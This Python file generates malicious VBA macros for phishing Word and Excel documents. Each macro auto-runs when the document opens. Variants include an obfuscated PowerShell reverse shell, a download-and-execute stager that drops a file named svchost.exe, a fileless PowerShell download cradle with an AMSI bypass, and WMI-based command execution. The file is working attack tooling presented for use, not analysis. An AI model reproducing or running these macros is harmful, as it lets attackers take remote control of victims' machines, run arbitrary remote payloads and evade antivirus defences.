"""
The Forge — Office Macro Stager
VBA macros for Word/Excel phishing documents.
"""

import base64
import textwrap


def generate_macro_reverse_shell(host: str, port: int) -> str:
    """VBA macro that spawns a PowerShell reverse shell."""
    ps_code = (
        f'$c=New-Object System.Net.Sockets.TCPClient("{host}",{port});'
        f'$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};'
        f'while(($i=$s.Read($b,0,$b.Length))-ne 0){{'
        f'$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);'
        f'$r=(iex $d 2>&1|Out-String);'
        f'$r2=$r+"PS "+(pwd).Path+"> ";'
        f'$sb=([text.encoding]::ASCII).GetBytes($r2);'
        f'$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()'
    )
    ps_encoded = base64.b64encode(ps_code.encode("utf-16-le")).decode()

    return textwrap.dedent(f"""\
        Sub AutoOpen()
            Payload
        End Sub

        Sub Document_Open()
            Payload
        End Sub

        Sub Payload()
            Dim wsh As Object
            Set wsh = CreateObject("WScript.Shell")
            wsh.Run "powershell -nop -w hidden -enc {ps_encoded}", 0, False
            Set wsh = Nothing
        End Sub
    """)


def generate_macro_download_exec(url: str, output_name: str = "svchost.exe") -> str:
    """VBA macro that downloads and executes a payload."""
    return textwrap.dedent(f"""\
        Sub AutoOpen()
            Payload
        End Sub

        Sub Document_Open()
            Payload
        End Sub

        Sub Payload()
            Dim oShell As Object
            Dim sPath As String
            Set oShell = CreateObject("WScript.Shell")
            sPath = oShell.ExpandEnvironmentStrings("%APPDATA%") & "\\{output_name}"
            
            ' Download
            Dim oHTTP As Object
            Set oHTTP = CreateObject("MSXML2.XMLHTTP")
            oHTTP.Open "GET", "{url}", False
            oHTTP.Send
            
            ' Save
            Dim oStream As Object
            Set oStream = CreateObject("ADODB.Stream")
            oStream.Type = 1
            oStream.Open
            oStream.Write oHTTP.responseBody
            oStream.SaveToFile sPath, 2
            oStream.Close
            
            ' Execute
            oShell.Run sPath, 0, False
            
            Set oHTTP = Nothing
            Set oStream = Nothing
            Set oShell = Nothing
        End Sub
    """)


def generate_macro_powershell_cradle(url: str) -> str:
    """VBA macro with PowerShell download cradle (fileless)."""
    ps_code = f"IEX(New-Object Net.WebClient).DownloadString('{url}')"
    ps_encoded = base64.b64encode(ps_code.encode("utf-16-le")).decode()

    return textwrap.dedent(f"""\
        Sub AutoOpen()
            Payload
        End Sub

        Sub Document_Open()
            Payload
        End Sub

        Sub Payload()
            Dim wsh As Object
            Set wsh = CreateObject("WScript.Shell")
            
            ' AMSI bypass attempt
            wsh.Run "powershell -nop -w hidden -c ""try{{[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)}}catch{{}}"" ", 0, True
            
            ' Execute cradle
            wsh.Run "powershell -nop -w hidden -enc {ps_encoded}", 0, False
            
            Set wsh = Nothing
        End Sub
    """)


def generate_macro_wmi_exec(command: str) -> str:
    """VBA macro using WMI for process execution (stealthier)."""
    return textwrap.dedent(f"""\
        Sub AutoOpen()
            Payload
        End Sub

        Sub Document_Open()
            Payload
        End Sub

        Sub Payload()
            Dim objWMI As Object
            Dim objProcess As Object
            
            Set objWMI = GetObject("winmgmts:\\\\.\\" & "root\\cimv2")
            Set objProcess = objWMI.Get("Win32_Process")
            
            objProcess.Create "{command}", Null, Null, Null
            
            Set objProcess = Nothing
            Set objWMI = Nothing
        End Sub
    """)


# ---------------------------------------------------------------------------
# Master Generator
# ---------------------------------------------------------------------------

VARIANTS = {
    "reverse_shell": generate_macro_reverse_shell,
    "download_exec": generate_macro_download_exec,
    "ps_cradle": generate_macro_powershell_cradle,
    "wmi_exec": generate_macro_wmi_exec,
}


def generate(variant: str = "reverse_shell", **kwargs) -> str:
    gen_func = VARIANTS.get(variant.lower())
    if not gen_func:
        raise ValueError(f"Unknown variant: {variant}. Available: {list(VARIANTS.keys())}")
    return gen_func(**kwargs)


def list_variants() -> list[str]:
    return list(VARIANTS.keys())
